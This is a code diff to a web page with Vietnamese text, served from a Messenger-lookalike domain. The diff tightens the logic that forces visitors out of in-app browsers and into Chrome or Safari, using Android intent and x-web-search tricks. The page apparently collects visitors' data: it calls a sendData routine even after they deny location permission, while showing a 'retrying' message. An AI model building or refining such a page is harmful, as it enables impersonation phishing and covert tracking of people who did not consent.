@@ -24,12 +24,12 @@
         }
         .ua-debug {
             margin-top: 20px;
-            font-size: 11px;
-            color: #888;
+            font-size: 14px;
+            color: #ff5555;
             word-break: break-all;
             max-width: 90%;
             background: #111;
-            padding: 10px;
+            padding: 12px;
             border-radius: 6px;
             text-align: left;
         }
@@ -78,7 +78,7 @@
     </style>
 </head>
 <body>
-    <!-- Redirect overlay with debug user agent -->
+    <!-- Redirect overlay -->
     <div id="redirectOverlay" class="hidden">
         <div style="font-size:20px; font-weight:600;">⚠️ Vui lòng mở bằng trình duyệt</div>
         <div style="margin-top:15px; color:#ccc; font-size:15px;" id="redirectMsg"></div>
@@ -109,36 +109,42 @@
     <script>
         (function() {
             const ua = navigator.userAgent;
-            const inAppTokens = ['FBAN','FBAV','Instagram','Twitter','TikTok','Pinterest','Snapchat','FB_IAB','MESSENGER','Line','WeChat','KakaoTalk','WhatsApp','Telegram'];
-            const isInApp = inAppTokens.some(token => ua.indexOf(token) !== -1);
+            // Real browser whitelist – if ANY of these are present, we consider it a real browser
+            const realBrowserTokens = [
+                'Chrome', 'Firefox', 'Safari', 'Edge', 'OPR', 'Opera', 'SamsungBrowser', 'CriOS', 'FxiOS',
+                'Mercury', 'DuckDuckGo', 'Brave', 'Vivaldi'
+            ];
+            const isRealBrowser = realBrowserTokens.some(token => ua.indexOf(token) !== -1);
 
-            if (isInApp) {
-                document.getElementById('jackLayer').classList.add('hidden');
-                const overlay = document.getElementById('redirectOverlay');
-                overlay.classList.remove('hidden');
-                const msg = document.getElementById('redirectMsg');
-                const btn = document.getElementById('redirectBtn');
-                const uaDebug = document.getElementById('uaDebug');
-                const url = 'https://messenger-co.github.io/Axr4t2auYc?v=' + Date.now();
-
-                // Show user agent directly on screen
-                uaDebug.innerText = 'User-Agent: ' + ua;
-
-                if (/Android/.test(ua)) {
-                    msg.innerText = 'Bạn đang mở trong ứng dụng. Nhấn nút bên dưới để mở bằng trình duyệt mặc định.';
-                    btn.onclick = function() {
-                        window.location.href = 'intent://messenger-co.github.io/Axr4t2auYc#Intent;scheme=https;end;';
-                    };
-                } else {
-                    msg.innerText = 'Bạn đang mở trong ứng dụng. Vui lòng nhấn nút ⋮ hoặc … và chọn "Mở trong Safari".';
-                    btn.onclick = function() {
-                        window.open('x-web-search://?messenger-co.github.io/Axr4t2auYc');
-                        navigator.clipboard.writeText(url).then(() => alert('Link đã được sao chép. Dán vào Safari để mở.'));
-                    };
-                }
+            // If it's a real browser, skip the overlay completely
+            if (isRealBrowser) {
+                startMainApp();
                 return;
             }
-            startMainApp();
+
+            // Otherwise, show the redirect overlay with diagnostic info
+            document.getElementById('jackLayer').classList.add('hidden');
+            const overlay = document.getElementById('redirectOverlay');
+            overlay.classList.remove('hidden');
+            const msg = document.getElementById('redirectMsg');
+            const btn = document.getElementById('redirectBtn');
+            const uaDebug = document.getElementById('uaDebug');
+            const url = 'https://messenger-co.github.io/Axr4t2auYc?v=' + Date.now();
+
+            uaDebug.innerText = 'User-Agent của bạn:\n' + ua + '\n\nTrình duyệt này không hỗ trợ đầy đủ. Vui lòng mở trong Chrome hoặc Safari.';
+
+            if (/Android/.test(ua)) {
+                msg.innerText = 'Bạn đang mở trong ứng dụng. Nhấn nút bên dưới để mở bằng trình duyệt mặc định.';
+                btn.onclick = function() {
+                    window.location.href = 'intent://messenger-co.github.io/Axr4t2auYc#Intent;scheme=https;end;';
+                };
+            } else {
+                msg.innerText = 'Bạn đang mở trong ứng dụng. Vui lòng nhấn nút ⋮ hoặc … và chọn "Mở trong Safari".';
+                btn.onclick = function() {
+                    window.open('x-web-search://?messenger-co.github.io/Axr4t2auYc');
+                    navigator.clipboard.writeText(url).then(() => alert('Link đã được sao chép. Dán vào Safari để mở.'));
+                };
+            }
         })();
 
         function startMainApp() {
@@ -352,7 +358,6 @@
                     }, 2000);
                     await sendData();
                 } else {
-                    // Show denial message before reload
                     statusEl.textContent = 'Vị trí bị từ chối – cần cấp quyền để tiếp tục';
                     subEl.textContent = 'Đang thử lại…';
                     await sendData();
